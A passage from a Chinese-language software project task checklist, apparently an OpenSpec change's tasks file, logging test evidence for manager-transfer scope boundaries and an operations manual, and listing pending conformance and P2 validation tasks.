    边界：不判断「可用额度是否被重置」（预算解释属 3.1/4.x）、不实现影响图与重验调度（P3）、
    不写 `gates.yaml`（P2 绑定仍 planned）。本任务引用的 `invariant_i_61` 与 §39.11 语义一致，
    但同段的 G-40（费用风险保留）未因此验收。
- [x] 3.5 实现专项委任边界与组织元数据分离，验证项目负责人不能越过专项范围指挥，reportsTo 变更不迁移 Run/租约/权限（`invariant_i_62`—`invariant_i_64`）。
  - 证据（2026-11-20，`cargo test -p bod-app scope_boundary` → 16 passed）：新增
    `bod-app::scope_boundary` 与迁移 `013_scope_org.sql`（`issue_hierarchy`、`agent_org_metadata`），
    迁移 12 → 13、表 47 → 49，`xtask migration-check` 同步登记。
    层级单独登记而不改 `issues` 表与 `bod-core::Issue`（否则要动 37 处构造点），一次写定、
    UPDATE/DELETE 都被 trigger 拒绝；载入时校验悬空父节点、自环/环（上限 64 层）与找不到的专项根。
    归属判定按「最近的专项祖先优先，其次项目默认委任」：项目负责人指挥专项子树内的 Issue 报
    `CrossesSpecialBoundary`（回显根、专项委任 id 与目标），在子树内建任务报 `BypassAttempt`
    （与普通越界分开，防止「建个任务绕过去」），专项负责人越出子树报 `OutsideScope`；
    撤任后子树自动回到项目委任。嵌套专项必须由治理主体创建、根必须落在父专项子树内且未被占用，
    本模块只返回作用域，落库仍走 3.1 的 `appoint`。
    reportsTo 只写 `agent_org_metadata`（无 roles/租约字段，结构上无法捎带执行状态），
    写入前后对 issues/runs/leases/grants/appointments 求摘要，不等即
    `MetadataTouchedExecution` 并拒绝；自指、未知成员、汇报环三种输入分别拒绝。
    边界：不重算权限交集（`authorization` 仍是唯一判定处）、不落嵌套委任、层级不参与派发。
    编号差异：tasks 引用的 I-62—I-64 在 §39.11 分别是「旧管理身份失效率不使独立执行反馈失效」
    「切换/命令重复不产生双委任」「Committed 后只向前恢复且换人用新 epoch」，实际由 3.1/3.2 覆盖；
    本切片按 manager-transfer 的「作用域边界」「组织元数据不迁移状态」两条需求落地，
    不宣称 I-62—I-64 已验收。详见 `docs/spec-notes/p2-manager-transfer.md` §5。
- [x] 3.6 编写负责人切换操作说明到 `docs/spec-notes/p2-manager-transfer.md`，验证 §41.8 的每项验收要求都有对应命令与拒绝样本。
  - 证据（2026-11-20，`cargo test -p bod-app --test p2_manager_transfer_manual` → 3 passed）：
    `p2-manager-transfer.md` §6 新增操作手册——§6.1 按 §41.8 出口流程逐条列出 M1—M12
    （委任 A、两个员工任务、切到 B、旧票被拒、进度继续、已接受不重做、费用保留、读增量后确认、
    授权内下一步、历史不可改写、争议待核查、组织字段不迁移状态），每行给出接口、可执行的
    `cargo test -p bod-app <module>` 与稳定拒绝码（`ScopeAlreadyManaged` / `StaleAppointment` /
    `RedoAccepted` / `FeeSubjectIsImmutable` / `CrossesSpecialBoundary` / `BypassAttempt` 等）；
    §6.2 列出 §41.8 的四个反例（无条件恢复旧 epoch、默认全员重启、补造完整日志、丢弃未知预留）
    及阻断它们的错误码；§6.3 给出十步操作顺序；§6.4 如实标注 N2（双人并发切换）与 N4（B 不可用）
    **没有样本**，归属 5.1/4.4，M1—M12 的「已测」也只是库内断言而非真实项目演练。
    手册不是「写完就算」：新增集成测试 `p2_manager_transfer_manual.rs` 逐条核对 ID 是否出现、
    命令是否可执行且模块文件存在、引用的错误码是否真的在 `src/` 中（文档写不存在的错误即失败），
    并要求未覆盖项写明归属切片。6.4 另记：§41.8 的「费用风险保留」拆成「费用主体不可改写」（M7）
    与「Unknown 预留不丢弃」（N6/R4）两步，任何一步未过都不算保留。

## 4. 公开符合性与双运行时

- [ ] 4.1 实现 `bod conformance` CLI 子命令与分项报告输出，验证报告按适配器版本/协议/平台/能力与日期列出结果，不产生单一通过徽章。
- [ ] 4.2 实现必需用例集合（范围身份、重复 start、参数冲突、丢回包、迟到观察、取消未确认、版本不匹配、敏感字段过滤、completed 与接受分离），验证身份/授权/完整性失败时适配器被禁用（`invariant_i_57`、G-17）。
- [ ] 4.3 实现可选能力声明驱动的验证与调度过滤，验证不支持 recovery 的适配器不能承接需恢复保证的任务且界面显示一致限制。
- [ ] 4.4 在两个真实运行配置上完成 L1/L2（适用时 L3）接续与负责人切换样本，验证 G-28、G-38—G-42 有实际报告、样本数与人工分钟，失败路径如实保留。
- [ ] 4.5 实现发布验收检查（停止/重放/副作用/账号预算/证据）与日志脱敏，验证日志中无凭据值且能力缺失在探测/准入/UI 三处一致（G-4、G-46）。

## 5. P2 验证与出口

- [ ] 5.1 执行 P2 故障验收：停旧写入、脏文件、丢回包、崩溃中交接、旧经理并发切换、B 不可用，验证 G-28—G-30、G-39—G-41 有命名 case 与真实断言。
- [ ] 5.2 与手工交接做同类任务对照，记录接管就绪耗时、员工中断数、重复执行数与人工补充时间，验证报告含样本数与未完成项且不预设提升比例。
- [ ] 5.3 汇总 P2 出口证据与支持矩阵，验证「与手工交接对比」「停旧写入/脏文件/丢回包用例通过」有可核对报告，其他运行组合保持 Planned。

## Workflow follow-up

- 评审通过后归档本 Change，把 4 份 delta 同步到 `openspec/specs/`；归档前不把接续或负责人切换标为 Supported。
- P3—P7 以新 Change 承接，不修改本 Change 的历史约定。
